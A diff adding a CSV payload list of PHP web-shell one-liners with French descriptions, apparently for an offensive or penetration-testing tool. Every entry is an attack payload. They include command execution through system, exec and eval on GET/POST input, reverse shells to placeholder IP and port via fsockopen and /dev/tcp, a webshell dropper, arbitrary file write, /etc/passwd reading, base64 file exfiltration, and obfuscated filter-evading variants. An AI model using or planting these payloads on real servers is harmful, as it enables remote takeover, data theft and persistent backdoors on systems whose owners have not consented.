@@ -1,0 +1,32 @@
+payload,description
+<?php system($_GET['cmd']); ?>,RCE GET cmd — system()
+<?php passthru($_GET['cmd']); ?>,RCE GET cmd — passthru()
+"<?php exec($_GET['cmd'],$o); echo implode(""\n"",$o); ?>",RCE GET cmd — exec() avec output
+<?php shell_exec($_GET['cmd']); ?>,RCE GET cmd — shell_exec()
+<?php echo `{$_GET['cmd']}`; ?>,RCE GET cmd — backtick operator
+<?php eval($_POST['code']); ?>,RCE POST code — eval()
+<?php assert($_POST['code']); ?>,RCE POST code — assert() (PHP<8)
+"<?php popen($_GET['cmd'],'r'); ?>",RCE GET cmd — popen()
+"<?php proc_open($_GET['cmd'],array(),$p); ?>",RCE GET cmd — proc_open()
+"<?php $sock=fsockopen('&IP',&PORT);exec('/bin/sh -i <&3 >&3 2>&3'); ?>",Reverse shell — fsockopen+exec fd3
+"<?php $sock=fsockopen('&IP',&PORT);shell_exec('/bin/sh -i <&3 >&3 2>&3'); ?>",Reverse shell — fsockopen+shell_exec fd3
+"<?php $sock=fsockopen('&IP',&PORT);system('/bin/sh -i <&3 >&3 2>&3'); ?>",Reverse shell — fsockopen+system fd3
+"<?php $sock=fsockopen('&IP',&PORT);passthru('/bin/sh -i <&3 >&3 2>&3'); ?>",Reverse shell — fsockopen+passthru fd3
+"<?php $sock=fsockopen('&IP',&PORT);`/bin/sh -i <&3 >&3 2>&3`; ?>",Reverse shell — fsockopen+backtick fd3
+"<?php $sock=fsockopen('&IP',&PORT);$proc=proc_open('/bin/sh',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>",Reverse shell — fsockopen+proc_open (note.txt)
+"<?php set_time_limit(0);$ip='&IP';$port=&PORT;$sock=fsockopen($ip,$port);$proc=proc_open('/bin/sh',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>",Reverse shell — set_time_limit+proc_open
+"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/&IP/&PORT 0>&1'""); ?>",Reverse shell — bash via exec()
+"<?php file_put_contents('/var/www/html/sh.php','<?php system($_GET[c]); ?>'); ?>",Drop webshell dans /var/www/html
+"<?php file_put_contents($_GET['f'],$_GET['d']); ?>",Écriture fichier arbitraire
+<?php echo file_get_contents('/etc/passwd'); ?>,Lire /etc/passwd inline
+<?php echo base64_encode(file_get_contents($_GET['f'])); ?>,Exfil fichier en base64
+<?php var_dump(scandir('.')); ?>,Lister répertoire courant
+<?php var_dump(scandir($_GET['d'])); ?>,Lister répertoire GET d
+<?php echo getcwd(); ?>,Afficher chemin courant
+<?php phpinfo(); ?>,phpinfo — config serveur complète
+<?php echo php_uname(); ?>,Info OS serveur
+<?php echo $_SERVER['DOCUMENT_ROOT']; ?>,Afficher DocumentRoot
+<?php include('php://input'); ?>,LFI via php://input — exec POST body
+"<?php include('data://text/plain;base64,'.base64_encode($_POST['c'])); ?>",RCE via data:// wrapper
+<?php eval(base64_decode($_POST['c'])); ?>,Eval base64 POST — contourne filtres
+<?php $f=str_rot13('flfgrz');$f($_GET['cmd']); ?>,RCE obfusqué ROT13 system
